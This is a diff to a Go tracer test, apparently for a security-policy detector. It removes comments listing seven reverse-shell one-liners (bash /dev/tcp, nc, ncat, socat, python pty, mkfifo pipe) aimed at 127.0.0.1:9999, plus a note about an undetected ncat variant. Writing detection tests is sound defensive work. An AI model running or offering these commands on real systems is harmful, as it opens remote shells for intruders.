@@ -127,18 +127,6 @@ func TestTracer(t *testing.T) {
 		},
 	}
 
-	// python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
-	// bash -i >& /dev/tcp/127.0.0.1/9999 0>&1
-	// ncat -e /bin/sh -i 127.0.0.1 9999
-	// nc -c sh 127.0.0.1 9999
-	// rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 9999 > /tmp/f
-	// /bin/bash -c 'exec 5<>/dev/tcp/127.0.0.1/9999;cat <&5 | while read line; do $line 2>&5 >&5; done'
-	// socat TCP:127.0.0.1:9999 EXEC:sh
-
-	// ncat -c sh 127.0.0.1 9999 (we will not detect this case)
-
-	// How pipes work in linux?
-
 	if err := tr.ApplyPolicy(policy); err != nil {
 		t.Fatalf("apply policy: %v", err)
 	}
